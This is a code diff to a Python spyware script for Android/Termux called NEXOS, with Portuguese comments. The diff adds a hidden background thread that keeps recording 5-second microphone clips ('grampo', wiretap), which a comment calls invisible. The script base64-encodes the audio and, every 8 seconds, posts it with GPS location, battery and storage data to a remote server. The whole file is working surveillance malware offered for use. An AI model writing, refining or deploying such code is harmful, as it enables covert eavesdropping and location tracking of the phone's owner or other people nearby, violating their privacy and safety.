@@ -4,51 +4,56 @@ import json
 import requests
 import os
 import base64
+import threading
 
 URL_SERVIDOR = "https://nexos-t0to.onrender.com/update"
 ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
-ARQUIVO_AUDIO = os.path.expanduser("~/grampo.mp3")
+ARQUIVO_AUDIO = os.path.expanduser("~/grampo.wav")
+
+audio_global_b64 = ""
 
 def run_command(cmd):
     try: return subprocess.check_output(cmd, shell=True).decode().strip()
     except: return ""
 
-def obter_ou_criar_id_unico():
+def obter_id_unico():
     if os.path.exists(ARQUIVO_ID):
         with open(ARQUIVO_ID, "r") as f: return f.read().strip()
     novo_id = f"NX-{str(os.getpid())[:4].upper()}"
     with open(ARQUIVO_ID, "w") as f: f.write(novo_id)
     return novo_id
 
-DEVICE_ID = obter_ou_criar_id_unico()
+DEVICE_ID = obter_id_unico()
 
 print("\n" + "="*45)
-print(f"🤖 SISTEMA NEXOS CORE COM ESCUTA ATIVADO!")
-print(f"🔑 ID PARA MONITORAR: {DEVICE_ID}")
+print(f"🤖  SISTEMA MULTI-THREAD NEXOS ATIVADO!")
+print(f"🔑  SEU MONITOR ID CONTINUA: {DEVICE_ID}")
 print("="*45 + "\n")
 
-def coletar_e_enviar():
-    # 1. Força a parada de qualquer gravação antiga perdida por segurança
-    run_command("termux-microphone-record -q")
-    os.system(f"rm -f {ARQUIVO_AUDIO}")
+# THREAD PARALELA: Fica gravando e quebrando o áudio de fundo de forma invisível
+def loop_gravacao_audio():
+    global audio_global_b64
+    while True:
+        try:
+            run_command("termux-microphone-record -q")
+            if os.path.exists(ARQUIVO_AUDIO): os.remove(ARQUIVO_AUDIO)
+            
+            # Grava no formato nativo .wav reconhecido instantaneamente por navegadores
+            subprocess.Popen(f"termux-microphone-record -f {ARQUIVO_AUDIO}", shell=True)
+            time.sleep(5)
+            run_command("termux-microphone-record -q")
+            
+            if os.path.exists(ARQUIVO_AUDIO) and os.path.getsize(ARQUIVO_AUDIO) > 500:
+                with open(ARQUIVO_AUDIO, "rb") as f:
+                    audio_global_b64 = base64.b64encode(f.read()).decode('utf-8')
+        except:
+            pass
+        time.sleep(1)
 
-    # 2. Liga o Microfone (o Android vai abrir o loop de tempo doido dele)
-    print("🎙️ Gravando ambiente (5 segundos)...")
-    subprocess.Popen(f"termux-microphone-record -f {ARQUIVO_AUDIO}", shell=True)
-    
-    # 3. CRONÔMETRO DO PYTHON: O Script espera 5 segundos certinhos enquanto você fala
-    time.sleep(5)
-    
-    # 4. CORTA NA MARRA: Manda o comando fechar o microfone no soco
-    run_command("termux-microphone-record -q")
+# Ativa a thread do microfone antes de começar o envio principal
+threading.Thread(target=loop_gravacao_audio, daemon=True).start()
 
-    # Transforma o arquivo mp3 gerado em texto Base64 para poder enviar via HTTP
-    audio_b64 = ""
-    if os.path.exists(ARQUIVO_AUDIO) and os.path.getsize(ARQUIVO_AUDIO) > 100:
-        with open(ARQUIVO_AUDIO, "rb") as audio_file:
-            audio_b64 = base64.b64encode(audio_file.read()).decode('utf-8')
-
-    # Coleta de sistema normais
+def enviar_dados_principais():
     battery = "N/A"
     out_bat = run_command("termux-battery-status")
     if out_bat:
@@ -65,7 +70,6 @@ def coletar_e_enviar():
                 if len(parts) >= 3: storage = f"{parts[3]} livres"
         except: pass
 
-    # Coleta de GPS ativa
     lat, lon = -16.6869, -49.2648
     out_loc = run_command("termux-location -p gps -r once")
     if out_loc:
@@ -82,16 +86,17 @@ def coletar_e_enviar():
         "uptime": "Ativo",
         "lat": lat,
         "lon": lon,
-        "audio_b64": audio_b64
+        "audio_b64": audio_global_b64  # Puxa o último áudio coletado pela outra thread
     }
 
     try:
-        response = requests.post(URL_SERVIDOR, json=payload, timeout=12)
+        response = requests.post(URL_SERVIDOR, json=payload, timeout=8)
         if response.status_code == 200: 
-            print(f"📡 Dados e Áudio transmitidos! GPS: {lat}, {lon}")
+            print(f"📡 [PRINCIPAL] Localização enviada! GPS: {lat}, {lon}")
     except Exception as e:
-        print(f"❌ Erro de envio: {e}")
+        print(f"❌ Falha de comunicação: {e}")
 
+# LOOP PRINCIPAL: Roda liso e livre a cada 8 segundos sem travar com sleep longo
 while True:
-    coletar_e_enviar()
-    time.sleep(5) # Espera 5 segundos e abre o próximo ciclo de gravação
+    enviar_dados_principais()
+    time.sleep(8)
